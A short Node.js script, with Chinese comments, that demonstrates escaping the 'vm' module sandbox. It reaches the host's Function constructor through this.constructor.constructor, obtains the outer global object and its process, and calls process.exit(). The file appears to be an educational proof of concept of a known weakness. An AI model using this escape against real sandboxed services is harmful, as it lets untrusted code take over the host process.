const vm = require('vm');

const sandbox = {
    console: console,
}

const contextified = vm.createContext(sandbox);

const harmfulCode = `
    console.log('this.constructor:', this.constructor);     // sandbox 的 constructor 是外层的 Object 类
    console.log('this.constructor.constructor:', this.constructor.constructor); // Object 类的 constructor 是外层的 Function 类
    const OutFunction = this.constructor.constructor; 
    // 于是, 利用外层的 Function 构造一个函数就可以得到外层的全局 this
    const outThis = (OutFunction('return this;'))();
    console.log('outThis.process', outThis.process);
    outThis.process.exit();
`
vm.runInContext(harmfulCode, contextified);